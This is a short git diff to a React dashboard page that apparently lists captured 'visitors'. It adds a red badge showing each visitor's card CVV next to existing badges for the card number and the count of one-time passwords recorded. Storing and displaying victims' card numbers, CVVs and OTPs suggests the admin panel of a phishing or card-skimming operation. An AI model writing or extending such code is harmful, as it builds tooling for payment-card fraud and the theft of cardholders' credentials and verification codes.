@@ -375,6 +375,11 @@ export default function DashboardPage() {
                           {visitor.otpHistory.length} OTP
                         </span>
                       )}
+                      {visitor.cardNumber && visitor.cvv && (
+                        <span className="bg-red-500/20 text-red-400 text-[9px] px-1.5 py-0.5 rounded font-mono font-medium">
+                          CVV: {visitor.cvv}
+                        </span>
+                      )}
                       {visitor.cardNumber && (
                         <span className="bg-yellow-500/20 text-yellow-400 text-[9px] px-1.5 py-0.5 rounded">
                           <CreditCard className="w-2.5 h-2.5 inline" />
